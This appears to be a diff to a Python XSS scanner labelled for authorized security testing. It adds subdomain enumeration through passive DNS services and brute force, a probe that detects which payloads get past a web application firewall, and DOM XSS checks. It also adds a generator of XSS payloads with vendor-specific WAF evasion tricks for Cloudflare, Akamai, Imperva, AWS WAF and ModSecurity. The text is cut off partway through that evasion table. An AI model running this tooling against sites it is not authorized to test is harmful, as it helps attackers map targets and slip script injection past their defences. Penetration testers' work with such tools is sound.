@@ -10,6 +10,7 @@ License: For authorized security testing only
 import argparse
 import re
 import sys
+import socket
 import time
 import random
 import concurrent.futures
@@ -19,6 +20,8 @@ if sys.platform == 'win32':
     sys.stdout.reconfigure(encoding='utf-8')
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
 from collections import deque
+from datetime import datetime, timedelta
+
 
 try:
     import requests
@@ -37,10 +40,323 @@ except ImportError as e:
     print("[*] Install with: pip3 install requests beautifulsoup4 colorama")
     sys.exit(1)
 
+try:
+    import dns.resolver
+except ImportError:
+    print(f"[!] Missing dependency: dnspython")
+    print("[*] Install with: pip3 install dnspython")
+    sys.exit(1)
+
+
 # Disable SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
+class SubdomainScanner:
+    """Subdomain discovery tool using online sources and brute force"""
+    
+    WORDLIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/DNS/subdomains-top1million-110000.txt"
+
+    
+    def __init__(self, domain, wordlist=None):
+        # Extract hostname if URL is provided
+        if '://' in domain:
+            parsed = urlparse(domain)
+            self.domain = parsed.netloc
+        else:
+            self.domain = domain
+        
+        # Remove path/params if user provided "example.com/path"
+        if '/' in self.domain:
+            self.domain = self.domain.split('/')[0]
+            
+        self.wordlist = wordlist
+        self.found_subdomains = set()
+        
+    def resolve_domain(self, domain):
+        """Resolve domain using rotating public DNS servers (Sublist3r logic)"""
+        try:
+            resolver = dns.resolver.Resolver()
+            # Public DNS servers (Google, Cloudflare, Quad9, OpenDNS, Level3)
+            nameservers = [
+                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', 
+                '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
+                '64.6.64.6', '64.6.65.6', '84.200.69.80', '84.200.70.40'
+            ]
+            resolver.nameservers = [random.choice(nameservers)]
+            resolver.lifetime = 2.0
+            resolver.timeout = 2.0
+            
+            # Query for A record
+            answers = resolver.resolve(domain, 'A')
+            if answers:
+                return True
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout, dns.exception.DNSException):
+            return False
+        except Exception:
+            return False
+        return False
+
+            
+    def online_recon(self):
+        print(f"\n{Fore.CYAN}[*] Starting online subdomain discovery (Passive DNS)...{Style.RESET_ALL}")
+        all_candidates = set()
+
+        
+        # crt.sh
+        try:
+            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                for entry in data:
+                    name_value = entry['name_value']
+                    subdomains = name_value.split('\n')
+                    for subdomain in subdomains:
+                        if self.domain in subdomain and '*' not in subdomain:
+                            all_candidates.add(subdomain.strip())
+
+
+        except Exception:
+            pass
+            
+        # Hackertarget
+        try:
+            url = f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                for line in response.text.split('\n'):
+                     if ',' in line:
+                         subdomain = line.split(',')[0]
+                         if self.domain in subdomain:
+                             clean_sub = subdomain.strip()
+                             all_candidates.add(clean_sub)
+
+
+        except Exception:
+            pass
+                    
+        # AlienVault OTX
+        try:
+            url = f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                for entry in data.get('passive_dns', []):
+                    hostname = entry.get('hostname')
+                    if hostname and self.domain in hostname and '*' not in hostname:
+                        all_candidates.add(hostname.strip())
+        except Exception:
+            pass
+            
+        # Anubis
+        try:
+            url = f"https://jldc.me/anubis/subdomains/{self.domain}"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                for subdomain in data:
+                    if self.domain in subdomain and '*' not in subdomain:
+                        all_candidates.add(subdomain.strip())
+        except Exception:
+            pass
+            
+        # URLScan
+        try:
+            url = f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                for entry in data.get('results', []):
+                    page_domain = entry.get('page', {}).get('domain')
+                    if page_domain and self.domain in page_domain:
+                        all_candidates.add(page_domain.strip())
+        except Exception:
+            pass
+            
+        # ThreatMiner
+        try:
+            url = f"https://api.threatminer.org/v2/domain.php?q={self.domain}&rt=5"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                for subdomain in data.get('results', []):
+                    if self.domain in subdomain and '*' not in subdomain:
+                        all_candidates.add(subdomain.strip())
+        except Exception:
+            pass
+
+        # RapidDNS
+        try:
+            url = f"https://rapiddns.io/subdomain/{self.domain}?full=1"
+            response = requests.get(url, timeout=10)
+            if response.status_code == 200:
+                # Simple regex extraction to avoid soup overhead if possible, or robust parsing
+                # RapidDNS fits in a table usually
+                import re
+                found = re.findall(r'<td>([\w\.-]+)</td>', response.text)
+                for subdomain in found:
+                    if self.domain in subdomain and '*' not in subdomain:
+                        all_candidates.add(subdomain.strip())
+        except Exception:
+            pass
+
+        # C99.nl
+        # C99.nl (Check last 5 days for cached scans)
+        for i in range(5):
+            try:
+                date_str = (datetime.now() - timedelta(days=i)).strftime('%Y-%m-%d')
+                url = f"https://subdomainfinder.c99.nl/scans/{date_str}/{self.domain}"
+                
+                response = requests.get(url, timeout=10)
+                if response.status_code == 200:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    links = soup.find_all('a', href=True)
+                    found_count = 0
+                    for link in links:
+                        href = link['href']
+                        # C99 links format: //subdomain.domain.com or https://...
+                        if self.domain in href:
+                             # Clean up protocol and path
+                             sub = href.replace('http://', '').replace('https://', '').replace('//', '').split('/')[0]
+                             if self.domain in sub and '*' not in sub:
+                                 all_candidates.add(sub.strip())
+                                 found_count += 1
+                                 
+                    if found_count > 0:
+                        # If we found data for a recent date, scanning further dates might be redundant but okay
+                        print(f"{Fore.CYAN}[*] Found cached C99.nl scan from {date_str}{Style.RESET_ALL}")
+                        break
+            except Exception:
+                pass
+
+
+
+            
+        print(f"{Fore.CYAN}[*] Validating {len(all_candidates)} potential subdomains from online sources...{Style.RESET_ALL}")
+        self.verify_subdomains(all_candidates)
+        print(f"{Fore.GREEN}[+] Online recon complete. Total checked: {len(all_candidates)}. Valid found: {len(self.found_subdomains)}{Style.RESET_ALL}")
+
+    def verify_subdomains(self, candidates):
+        """Verify if subdomains resolve to an IP"""
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            future_to_sub = {
+                executor.submit(self.resolve_domain, sub): sub
+                for sub in candidates
+            }
+            
+            for future in concurrent.futures.as_completed(future_to_sub):
+                subdomain = future_to_sub[future]
+                try:
+                    is_valid = future.result()
+                    if is_valid:
+                        if subdomain not in self.found_subdomains:
+                            self.found_subdomains.add(subdomain)
+                            print(f"{Fore.GREEN}[+] Found [{len(self.found_subdomains)}]: {subdomain}{Style.RESET_ALL}")
+                except Exception:
+                    pass
+
+
+    def brute_force(self):
+        print(f"\n{Fore.CYAN}[*] Starting local subdomain brute force...{Style.RESET_ALL}")
+
+        
+        # Default common subdomains
+        common_subs = [
+            'www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2', 'smtp', 'secure',
+            'vpn', 'm', 'shop', 'ftp', 'mail2', 'test', 'portal', 'ns', 'ww1', 'host',
+            'support', 'dev', 'web', 'bbs', 'ww42', 'mx', 'email', 'cloud', '1', 'mail1',
+            '2', 'forum', 'owa', 'www2', 'gw', 'admin', 'store', 'mx1', 'cdn', 'api',
+            'exchange', 'app', 'gov', 'tmp', 'vps', 'gov.cn', 'news', 'member', 'img',
+            'pop', 'market', 'sso', 'login', 'dashboard', 'erp', 'crm', 'docs', 'files',
+            'autodiscover', 'calendar', 'video', 'images', 'static', 'assets', 'git', 'gitlab',
+            'jenkins', 'manage', 'manager', 'account', 'accounts', 'user', 'users', 'auth',
+            'staging', 'stage', 'beta', 'demo', 'test1', 'test2', 'dev1', 'dev2', 'uat',
+            'intranet', 'wiki', 'kb', 'help', 'status', 'monitor', 'zabbix', 'nagios', 'grafana',
+            'cpanel', 'whm', 'plesk', 'db', 'database', 'sql', 'mysql', 'mssql', 'postgres',
+            'oracle', 'redis', 'mongo', 'elasticsearch', 'elastic', 'kibana', 'log', 'logs'
+        ]
+        
+        # Load from file if provided or download default
+        if self.wordlist:
+            try:
+                with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                    common_subs = [line.strip() for line in f if line.strip()]
+                print(f"{Fore.GREEN}[+] Loaded {len(common_subs)} subdomains from custom wordlist{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error reading wordlist: {e}{Style.RESET_ALL}")
+        elif not self.wordlist:
+            # Check for local default wordlist or download
+            wordlist_path = "subdomains.txt"
+            import os
+            if not os.path.exists(wordlist_path):
+                print(f"{Fore.YELLOW}[*] Default wordlist not found. Downloading top 110,000 subdomains...{Style.RESET_ALL}")
+                try:
+                    response = requests.get(self.WORDLIST_URL, timeout=30)
+                    if response.status_code == 200:
+                        with open(wordlist_path, 'w', encoding='utf-8') as f:
+                            f.write(response.text)
+                        print(f"{Fore.GREEN}[+] Successfully downloaded default wordlist!{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}[!] Failed to download wordlist. Using internal fallback.{Style.RESET_ALL}")
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Download error: {e}. Using internal fallback.{Style.RESET_ALL}")
+            
+            # Try to load the downloaded/existing wordlist
+            if os.path.exists(wordlist_path):
+                try:
+                    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        file_subs = [line.strip() for line in f if line.strip()]
+                    if file_subs:
+                        common_subs = file_subs
+                        print(f"{Fore.GREEN}[+] Loaded {len(common_subs)} subdomains from default wordlist{Style.RESET_ALL}")
+                except Exception:
+                    pass
+
+        
+        found_new = 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            future_to_sub = {
+                executor.submit(self.resolve_domain, f"{sub}.{self.domain}"): f"{sub}.{self.domain}" 
+                for sub in common_subs
+            }
+            
+            for future in concurrent.futures.as_completed(future_to_sub):
+                subdomain = future_to_sub[future]
+                try:
+                    is_valid = future.result()
+                    if is_valid:
+                        if subdomain not in self.found_subdomains:
+                            self.found_subdomains.add(subdomain)
+                            found_new += 1
+                            print(f"{Fore.GREEN}[+] Found [{len(self.found_subdomains)}]: {subdomain}{Style.RESET_ALL}")
+                except Exception:
+
+                    pass
+                    
+        print(f"{Fore.GREEN}[+] Brute force found {found_new} new subdomains{Style.RESET_ALL}")
+
+    def run(self):
+        self.print_banner()
+        self.online_recon()
+        self.brute_force()
+        print(f"\n{Fore.CYAN}[*] Subdomain discovery complete.{Style.RESET_ALL}")
+        if self.found_subdomains:
+            print(f"{Fore.GREEN}[+] Total unique subdomains found: {len(self.found_subdomains)}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}{'='*50}{Style.RESET_ALL}")
+            for sub in sorted(list(self.found_subdomains)):
+                print(sub)
+            print(f"{Fore.WHITE}{'='*50}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}[-] No subdomains found.{Style.RESET_ALL}")
+
+    def print_banner(self):
+        print(f"""
+{Fore.CYAN}╔{'═'*50}╗
+{Fore.CYAN}║   {Fore.YELLOW}🔎 Subdomain Discovery Module{Fore.CYAN}                  ║
+{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}
+""")
 
 class XSSScanner:
     """Advanced XSS Vulnerability Scanner"""
@@ -1768,10 +2084,11 @@ class XSSScanner:
         'preview', 'demo', 'sample', 'example', 'param', 'arg', 'var',
     ]
     
-    def __init__(self, target, max_depth=3, timeout=10, threads=5, verbose=False, custom_payloads=None, first_only=True, waf_bypass=False, param_discovery=True, brute_params=True, force_test=True, deep_scan=False):
+    def __init__(self, target, max_depth=3, timeout=10, threads=5, verbose=False, custom_payloads=None, first_only=True, waf_bypass=False, param_discovery=True, brute_params=True, force_test=True, deep_scan=False, wayback_limit=50):
         self.target = self._normalize_url(target)
         self.max_depth = max_depth
         self.timeout = timeout
+        self.threads = threads  # Fix: Store threads for use in other methods
         self.verbose = verbose
         self.first_only = first_only  # Stop after first successful payload per param
         self.waf_bypass = waf_bypass  # Enable WAF bypass mode
@@ -1779,6 +2096,7 @@ class XSSScanner:
         self.brute_params = brute_params  # Enable parameter brute-forcing
         self.force_test = force_test  # Force test common params even when none discovered
         self.deep_scan = deep_scan  # Enable deep scanning (comprehensive test)
+        self.wayback_limit = wayback_limit  # Limit for Wayback URLs ('all' or int)
         self.waf_detected = None  # Will store detected WAF name
         self.waf_info = {}  # Store WAF detection details
         self.visited = set()
@@ -1787,6 +2105,7 @@ class XSSScanner:
         self.tested_params = set()  # Track which params already have confirmed vulns
         self.custom_payloads = custom_payloads  # User-provided payload list
         self.discovered_params = set()  # Track all discovered parameters
+        self.working_bypass_payloads = [] # Store payloads that successfully bypassed WAF
         self.session = requests.Session()
         
 
@@ -1806,7 +2125,12 @@ class XSSScanner:
         # This prevents wasting time sending heavy payloads to a site with no WAF
         if self.waf_bypass:
             if self.waf_detected:
-                return self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
+                # Prioritize identified working bypass payloads
+                all_payloads = self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
+                if self.working_bypass_payloads:
+                     # Put proven working payloads at HEAD
+                    return self.working_bypass_payloads + all_payloads
+                return all_payloads
             else:
                 # WAF bypass enabled but no WAF detected
                 # We can either warn and skip, or just skip. 
@@ -1876,14 +2200,60 @@ class XSSScanner:
             self.waf_detected = detected_wafs[0]  # Primary WAF
             self.waf_info['all_detected'] = detected_wafs
             
+            self.waf_info['all_detected'] = detected_wafs
+            
             self._print_waf_detection_result(detected_wafs)
-            return detected_wafs
-        else:
-            if successful_probes == 0 and connection_errors > 0:
-                print(f"{Fore.RED}[!] WAF detection failed: Connection timeout/error{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.GREEN}[+] No WAF detected{Style.RESET_ALL}")
-            return []
+            
+            # If WAF detected and bypass enabled, try to identify specific working bypass payloads
+            if self.waf_bypass:
+                self._identify_working_bypass()
+            
+    def _identify_working_bypass(self):
+        """Proactively identify which bypass payloads work against the detected WAF"""
+        print(f"{Fore.CYAN}[*] Testing WAF bypass payloads to identify effective vectors...{Style.RESET_ALL}")
+        
+        # Test a subset of high-probability bypass payloads
+        test_candidates = self.WAF_BYPASS_PAYLOADS[:30] + self.WAF_BYPASS_PAYLOADS[-10:]
+        
+        # Use a dummy parameter that is likely reflected or at least processed
+        dummy_param = "q"
+        base_url = self.target
+        
+        working_count = 0
+        
+        # Use ThreadPool for speed
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
+            future_to_payload = {}
+            for payload in test_candidates:
+                if '?' in base_url:
+                    test_url = f"{base_url}&{dummy_param}={payload}"
+                else:
+                    test_url = f"{base_url}?{dummy_param}={payload}"
+                
+                future_to_payload[executor.submit(self.session.get, test_url, timeout=5, verify=False)] = payload
+            
+            for future in concurrent.futures.as_completed(future_to_payload):
+                payload = future_to_payload[future]
+                try:
+                    response = future.result()
+                    # Check if NOT blocked (403/406/50x are usually blocks)
+                    if response.status_code == 200:
+                        self.working_bypass_payloads.append(payload)
+                        working_count += 1
+                        if self.verbose:
+                            print(f"{Fore.GREEN}[+] Potential bypass found: {payload[:30]}...{Style.RESET_ALL}")
+                        
+                        # Stop if we found enough working examples to prioritize
+                        if working_count >= 5:
+                            executor.shutdown(wait=False)
+                            break
+                except:
+                    pass
+        
+        if working_count > 0:
+            print(f"{Fore.GREEN}[+] Identified {working_count} potential bypass payloads! Prioritizing them in scan.{Style.RESET_ALL}")
+            # Add these to top of list
+            self.working_bypass_payloads = list(set(self.working_bypass_payloads)) # Dedup
     
     def _analyze_response_for_waf(self, response):
         """Analyze HTTP response for WAF signatures"""
@@ -2224,15 +2594,47 @@ class XSSScanner:
         
         queue = deque([(self.target, 0)])
         
-        # Seed crawl with Wayback URLs if enabled
+        # Seed crawl with Wayback URLs if enabled (LIMITED to prevent hang)
         if self.param_discovery:
             historical_urls = self._extract_wayback_params(self.target)
-            for hist_url in historical_urls:
+            
+            # Determine limit logic
+            urls_to_add = []
+            limit_msg = ""
+            
+            if str(self.wayback_limit).lower() == 'all':
+                urls_to_add = historical_urls
+                limit_msg = "unlimited"
+            else:
+                try:
+                    limit_val = int(self.wayback_limit)
+                    urls_to_add = historical_urls[:limit_val]
+                    limit_msg = f"{limit_val}"
+                except ValueError:
+                    urls_to_add = historical_urls[:50] # Fallback
+                    limit_msg = "50 (fallback)"
+
+            added_count = 0
+            for hist_url in urls_to_add:
                 if self._is_same_domain(hist_url):
-                    queue.append((hist_url, 0))
+                    queue.append((hist_url, 1))  # Add at depth 1 to limit further crawling
+                    added_count += 1
+            
+            if added_count > 0:
+                print(f"{Fore.YELLOW}[*] Added {added_count} Wayback URLs to queue (Limit: {limit_msg}){Style.RESET_ALL}")
+                if len(historical_urls) > added_count:
+                    print(f"{Fore.YELLOW}[*] ... skipped {len(historical_urls) - added_count} older URLs to prevent hang (use --wayback-limit 'all' to scan everything){Style.RESET_ALL}")
+        
+        crawl_count = 0
+        total_queued = len(queue)
         
         while queue:
             url, depth = queue.popleft()
+            crawl_count += 1
+            
+            # Progress indicator to show scanner is not stuck
+            if crawl_count % 5 == 0 or crawl_count <= 3:
+                print(f"{Fore.BLUE}[*] Crawling... [{crawl_count} pages processed]{Style.RESET_ALL}", end='\r')
             
             if depth > self.max_depth:
                 continue
@@ -2703,7 +3105,8 @@ class XSSScanner:
                             self.found_params[base_endpoint]['get'].add(param)
                             self.discovered_params.add(param)
                             found_params_count += 1
-                            print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
+                            if self.verbose:
+                                print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
                             
                             # Add this endpoint to visited for XSS testing
                             self.visited.add(base_endpoint)
@@ -2751,7 +3154,8 @@ class XSSScanner:
                         self.discovered_params.add('key')
                         found_params_count += 1
                         self.visited.add(base_endpoint)
-                        print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected 'key' param @ {Fore.WHITE}{pattern_url}{Style.RESET_ALL}")
+                        if self.verbose:
+                            print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected 'key' param @ {Fore.WHITE}{pattern_url}{Style.RESET_ALL}")
                     
                     # Also test other common params
                     for param in ['id', 'page', 'search', 'q', 'name']:
@@ -2763,7 +3167,8 @@ class XSSScanner:
                                 self.found_params[base_endpoint]['get'].add(param)
                                 self.discovered_params.add(param)
                                 found_params_count += 1
-                                print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
+                                if self.verbose:
+                                    print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
                         except:
                             continue
                             
@@ -2771,9 +3176,11 @@ class XSSScanner:
                 continue
         
         if found_params_count > 0:
-            print(f"\n{Fore.GREEN}[+] AUTO-CRAWL: Discovered {found_params_count} reflected parameters on PHP endpoints!{Style.RESET_ALL}")
+            if self.verbose:
+                print(f"\n{Fore.GREEN}[+] AUTO-CRAWL: Discovered {found_params_count} reflected parameters on PHP endpoints!{Style.RESET_ALL}")
         else:
-            print(f"{Fore.YELLOW}[~] AUTO-CRAWL: No additional PHP endpoint parameters found{Style.RESET_ALL}")
+            if self.verbose:
+                print(f"{Fore.YELLOW}[~] AUTO-CRAWL: No additional PHP endpoint parameters found{Style.RESET_ALL}")
         
         return found_params_count
     
@@ -3237,9 +3644,19 @@ class XSSScanner:
         print(f"\n{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
         print(f"{Fore.CYAN}|{' '*18}🔍 XSS VULNERABILITY TESTING{' '*20}|{Style.RESET_ALL}")
         print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}| {Fore.WHITE}Payloads:    {Fore.YELLOW}{len(payloads):>6} {Fore.CYAN}({payload_source}){' '*38}|{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}| {Fore.WHITE}Parameters:  {Fore.YELLOW}{total_params:>6}{' '*48}|{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}| {Fore.WHITE}Total Tests: {Fore.YELLOW}{total_tests:>6}{' '*48}|{Style.RESET_ALL}")
+        
+        # Dynamic padding calculation
+        payload_line = f"Payloads:    {len(payloads)} ({payload_source})"
+        param_line = f"Parameters:  {total_params}" 
+        test_line = f"Total Tests: {total_tests}"
+        
+        padding_p = 68 - len(payload_line) - 2
+        padding_par = 68 - len(param_line) - 2
+        padding_t = 68 - len(test_line) - 2
+        
+        print(f"{Fore.CYAN}| {Fore.WHITE}{payload_line}{' '*max(0, padding_p)}|{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}| {Fore.WHITE}{param_line}{' '*max(0, padding_par)}|{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}| {Fore.WHITE}{test_line}{' '*max(0, padding_t)}|{Style.RESET_ALL}")
         
         # Show WAF bypass mode info if active
         if is_waf_bypass:
@@ -3261,6 +3678,45 @@ class XSSScanner:
                 # Display URL being tested
                 short_url = url[:60] + '...' if len(url) > 60 else url
                 print(f"{Fore.BLUE}┌─ {Fore.WHITE}Testing: {Fore.CYAN}{short_url}{Style.RESET_ALL}")
+            
+            # Perform DOM XSS Check
+            try:
+                # We need fresh content for the base URL to check for DOM sinks
+                if self.verbose:
+                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  Analyzing for DOM XSS...{Style.RESET_ALL}")
+                
+                dom_resp = self.session.get(url, timeout=self.timeout, verify=False)
+                dom_soup = BeautifulSoup(dom_resp.text, 'html.parser')
+                
+                dom_vulns = self._test_dom_xss(url, dom_soup)
+                
+                if dom_vulns:
+                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  DOM XSS Analysis: {Fore.RED}[{len(dom_vulns)} POTENTIAL VULNS FOUND]{Style.RESET_ALL}")
+                    for dv in dom_vulns:
+                        # Construct proper vulnerability object
+                        dom_vuln_data = {
+                            'url': url,
+                            'param': dv['source'],
+                            'method': 'DOM',
+                            'type': 'dom',
+                            'full_url': dv.get('exploitation_url', url),
+                            'payload': '<img src=x onerror=alert(1)>',
+                            'severity': dv['severity'],
+                            'context': f"{dv['source']} -> {dv['sink']}",
+                            'is_waf_bypass': False
+                        }
+                        
+                        # Add to vulnerabilities list
+                        self.vulnerabilities.append(dom_vuln_data)
+                        
+                        # Print standard report
+                        self._print_vuln_report(dom_vuln_data, len(self.vulnerabilities))
+                elif self.verbose:
+                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  DOM XSS Analysis: {Fore.GREEN}[CLEAN]{Style.RESET_ALL}")
+                    
+            except Exception as e:
+                if self.verbose:
+                    print(f"{Fore.YELLOW}│  [!] DOM analysis failed: {e}{Style.RESET_ALL}")
             
             # Test GET parameters
             for param in params['get']:
@@ -3358,16 +3814,26 @@ class XSSScanner:
         # Determine context icon/text
         context = vuln_data.get('context', 'unknown').upper()
         
-        print(f"\n{Fore.RED}┌─ [{count}] {Style.BRIGHT}Reflected XSS{Style.RESET_ALL} ─ {sev_color}{severity} SEVERITY{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🌐 URL: {Fore.BLUE}{vuln_data['url']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}📍 Parameter: {Fore.CYAN}{vuln_data['param']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🔧 Method: {Fore.MAGENTA}{vuln_data['method']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🎯 Context: {Fore.YELLOW}{context}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🚀 Payload: {Fore.GREEN}{vuln_data['payload']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🔗 Test URL: {Fore.BLUE}{vuln_data['full_url']}{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}📊 Confidence: {Fore.GREEN}Very High{Style.RESET_ALL}")
-        print(f"{Fore.RED}│ {Fore.WHITE}🏷️  CVEs: {Fore.CYAN}CWE-79 (XSS){Style.RESET_ALL}{Fore.RED}") # Closing the box implicitly by color reset or next line
-        print(f"{Fore.RED}└───────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
+        # Determine Header
+        vuln_type = vuln_data.get('type', 'reflected').upper()
+        header_text = f"{vuln_type} XSS"
+        
+        if self.verbose:
+            print(f"\n{Fore.RED}┌─ [{count}] {Style.BRIGHT}{header_text}{Style.RESET_ALL} ─ {sev_color}{severity} SEVERITY{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🌐 URL: {Fore.BLUE}{vuln_data['url']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}📍 Parameter: {Fore.CYAN}{vuln_data['param']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🔧 Method: {Fore.MAGENTA}{vuln_data['method']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🎯 Context: {Fore.YELLOW}{context}{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🚀 Payload: {Fore.GREEN}{vuln_data['payload']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🔗 Test URL: {Fore.BLUE}{vuln_data['full_url']}{Style.RESET_ALL}")
+            
+            # WAF Bypass Indicator
+            if vuln_data.get('is_waf_bypass'):
+                print(f"{Fore.RED}│ {Fore.MAGENTA}⚔️  {Style.BRIGHT}WAF BYPASS SUCCESSFUL!{Style.RESET_ALL} {Fore.WHITE}(Payload skipped filters){Style.RESET_ALL}")
+                
+            print(f"{Fore.RED}│ {Fore.WHITE}📊 Confidence: {Fore.GREEN}Very High{Style.RESET_ALL}")
+            print(f"{Fore.RED}│ {Fore.WHITE}🏷️  CVEs: {Fore.CYAN}CWE-79 (XSS){Style.RESET_ALL}{Fore.RED}") # Closing the box implicitly by color reset or next line
+            print(f"{Fore.RED}└───────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
     
     def _test_single_payload(self, url, param, method, payload, is_waf_bypass):
         """Test a single payload (helper for threading)"""
@@ -3419,6 +3885,9 @@ class XSSScanner:
                 # Classify the vulnerability
                 classification = self._classify_xss_type(url, param, method, payload, response)
                 
+                # Check if this was a known WAF bypass payload
+                is_special_bypass = payload in self.WAF_BYPASS_PAYLOADS
+                
                 return {
                     'url': url,
                     'param': param,
@@ -3428,6 +3897,7 @@ class XSSScanner:
                     'encoded_url': encoded_url,
                     'status_code': response.status_code,
                     'type': classification['type'],
+                    'is_waf_bypass': is_special_bypass,
                     'context': classification['context'],
                     'severity': classification['severity']
                 }
@@ -3530,47 +4000,456 @@ class XSSScanner:
             'severity': severity
         }
     
+    def _generate_dynamic_payloads(self, url, sink_type='html', context=None):
+        """Generate dynamic payloads based on target characteristics - ALWAYS ENABLED"""
+        from urllib.parse import urlparse
+        
+        dynamic_payloads = []
+        domain = urlparse(url).netloc
+        
+        # Base payloads that will be modified
+        base_payloads = {
+            'alert_variants': [
+                ('alert', 'alert(1)'),
+                ('prompt', 'prompt(1)'),
+                ('confirm', 'confirm(1)'),
+                ('console.log', 'console.log(1)'),
+                ('print', 'print()'),
+            ],
+            'tags': [
+                ('img', '<img src=x onerror={func}>'),
+                ('svg', '<svg onload={func}>'),
+                ('body', '<body onload={func}>'),
+                ('video', '<video><source onerror={func}>'),
+                ('audio', '<audio src onerror={func}>'),
+                ('details', '<details open ontoggle={func}>'),
+                ('marquee', '<marquee onstart={func}>'),
+                ('input', '<input onfocus={func} autofocus>'),
+                ('iframe', '<iframe srcdoc="<script>{func}</script>">'),
+                ('object', '<object data="javascript:{func}">'),
+                ('embed', '<embed src="javascript:{func}">'),
+                ('math', '<math><maction xlink:href=javascript:{func}>X</maction></math>'),
+            ],
+            'context_break': [
+                ('double_quote', '"><{tag}>'),
+                ('single_quote', "'><{tag}>"),
+                ('backtick', '`><{tag}>'),
+                ('script_break', '</script><script>{func}</script>'),
+            ],
+        }
+        
+        # Determine WAF-specific evasions based on detected WAF
+        waf_evasions = {
+            'cloudflare': [
+                lambda p: p.replace('alert', 'al\\x65rt'),
+                lambda p: p.replace('(1)', '`1`'),
+                lambda p: p.replace('onerror=', 'onerror\t='),
+                lambda p: p.replace('<script>', '<scr\tipt>'),
+            ],
+            'akamai': [
+                lambda p: p.replace('alert(1)', 'alert?.()'),
+                lambda p: p.replace('javascript:', 'java\tscript:'),
+                lambda p: p.replace('onerror', 'ONERROR'),
+            ],
+            'imperva': [
+                lambda p: p.replace('alert', 'al\u200Bert'),
+                lambda p: p.replace('script', 'scr\u200Bipt'),
+                lambda p: p.replace('(1)', '(document.domain)'),
+            ],
+            'aws_waf': [
+                lambda p: p.replace('<', '\u003C'),
+                lambda p: p.replace('>', '\u003E'),
+                lambda p: p.replace('alert(1)', 'window["alert"](1)'),
+            ],
+            'modsecurity': [
+                lambda p: p.replace('alert(1)', 'alert(String.fromCharCode(49))'),
+                lambda p: p.replace('script', 'Script'),
+                lambda p: p.replace(' ', '/**/'),
+            ],
